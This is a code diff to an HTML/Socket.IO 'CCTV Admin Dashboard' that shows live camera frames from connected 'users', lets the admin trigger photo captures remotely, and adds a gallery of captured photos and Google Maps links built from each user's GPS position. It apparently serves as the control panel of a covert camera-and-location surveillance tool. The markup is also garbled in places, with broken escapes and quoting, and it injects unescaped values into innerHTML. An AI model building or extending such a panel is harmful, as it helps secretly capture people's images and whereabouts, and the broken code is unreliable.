@@ -2,18 +2,23 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CCTV Admin</title>
+<title>CCTV Admin Dashboard</title>
 <style>
 body { font-family: Arial; background: #121212; color: #fff; margin: 0; padding: 20px; }
 #login { position: fixed; top:0; left:0; width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:100; }
 input, button { padding: 10px; margin: 5px; font-size: 15px; border-radius: 5px; border: none; }
 button { background: #00e676; font-weight: bold; cursor: pointer; }
-.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 20px; }
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 15px; }
 .card { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
-.head { background: #252525; padding: 8px; font-size: 12px; display: flex; justify-content: space-between; }
-.body img { width: 100%; height: 200px; object-fit: cover; background: #000; display: block; }
+.head { background: #252525; padding: 8px; font-size: 11px; display: flex; justify-content: space-between; }
+.body img { width: 100%; height: 180px; object-fit: cover; background: #000; display: block; }
 .footer { padding: 8px; background: #1e1e1e; }
 .footer button { width: 100%; background: #ff1744; color: #fff; }
+.gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 15px; }
+.p-card { background: #222; padding: 6px; border-radius: 5px; text-align: center; }
+.p-card img { width: 100%; border-radius: 4px; }
+.btn-dl { background: #0288d1; color:#fff; display:block; padding:4px; margin-top:4px; text-decoration:none; font-size:11px; border-radius:3px; }
+.btn-del { background: #d32f2f; color:#fff; width:100%; padding:4px; margin-top:4px; font-size:11px; border-radius:3px; cursor:pointer; }
 </style>
 </head>
 <body>
@@ -25,6 +30,9 @@ button { background: #00e676; font-weight: bold; cursor: pointer; }
 <h2>?? CCTV Multi-Screen Dashboard</h2>
 <span id="cnt">Active: 0</span>
 <div class="grid" id="grid"></div>
+<h3 style="margin-top:30px;">?? Captured Photos Gallery</h3>
+<div class="gallery" id="gallery"></div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
 const socket = io();
@@ -35,19 +43,42 @@ socket.emit('admin-auth-success');
 } else alert('Wrong Password');
 }
 function capture(id) { socket.emit('admin-trigger-capture', id); }
+function deletePhoto(fn, elId) { socket.emit('delete-photo', fn); document.getElementById(elId).remove(); }
+
 socket.on('update-users-list', (users) => {
 const keys = Object.keys(users);
 document.getElementById('cnt').innerText = 'Active Users: ' + keys.length;
 const grid = document.getElementById('grid');
 grid.innerHTML = '';
 keys.forEach((id, idx) => {
-const dev = users[id].deviceInfo || 'Device';
-grid.innerHTML += '<div class=\card\ id=\c_' + id + '\><div class=\head\><span>CAM ' + (idx+1) + ': ' + dev + '</span><span style=\color:red\>? LIVE</span></div><div class=\ody\><img id=\img_' + id + '\ src=\\></div><div class=\ooter\><button onclick=\capture(\\'' + id + '\\')\>?? Capture Photo</button></div></div>';
+const u = users[id];
+const dev = u.deviceInfo || 'Device';
+let locHtml = 'GPS: Not shared';
+if(u.location) {
+locHtml = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676">?? View Map</a>';
+}
+grid.innerHTML += '<div class="card" id="c_' + id + '"><div class="head"><span>CAM ' + (idx+1) + ': ' + dev + '</span><span>' + locHtml + '</span></div><div class="body"><img id="img_' + id + ' src=`"></div><div class="footer"><button onclick="capture(\\'' + id + '\\')">?? Capture Photo</button></div></div>';
 });
 });
+
 socket.on('update-live-stream', (d) => {
 const img = document.getElementById('img_' + d.socketId);
 if(img) img.src = d.frameData;
+});
+
+function addPhotoToGallery(imgData, fn) {
+const gallery = document.getElementById('gallery');
+const elId = 'p_' + fn.replace(/[^a-zA-Z0-9]/g, '');
+if(document.getElementById(elId)) return;
+gallery.innerHTML += '<div class="p-card" id="' + elId + '"><img src="' + imgData + '"><a class="btn-dl" href="' + imgData + '" download="' + fn + '">?? Download</a><button class="btn-del" onclick="deletePhoto(\\'' + fn + '\\', \\'' + elId + '\\')">??? Delete</button></div>';
+}
+
+socket.on('load-stored-photos', (photos) => {
+photos.forEach(p => addPhotoToGallery(p.imageData, p.fileName));
+});
+
+socket.on('send-photo-to-admin', (p) => {
+addPhotoToGallery(p.imageData, p.fileName);
 });
 </script>
 </body>
